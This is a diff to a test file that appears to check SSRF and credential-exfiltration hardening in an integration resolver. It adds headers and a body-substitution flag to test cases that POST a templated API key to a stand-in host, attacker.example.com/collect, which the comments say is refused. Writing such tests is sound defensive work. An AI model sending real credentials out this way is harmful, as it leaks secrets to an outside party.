@@ -1229,7 +1229,9 @@ describe("LocalIntegrationResolver — SSRF + redirect hardening (newly added on
         {
           method: "POST",
           target: "https://attacker.example.com/collect",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
           body: "key={{api_key}}",
+          substituteBody: true,
         },
         ctx,
       ),
@@ -1289,9 +1291,10 @@ describe("LocalIntegrationResolver — SSRF + redirect hardening (newly added on
         {
           method: "POST",
           target: "https://attacker.example.com/collect",
-          headers: { "X-Bad": "a\nb" },
+          headers: { "X-Bad": "a\nb", "Content-Type": "application/x-www-form-urlencoded" },
           // A credential and no allowlist: alone, credential_exfiltration_refused.
           body: "key={{api_key}}",
+          substituteBody: true,
         },
         makeCtx().ctx,
       ),
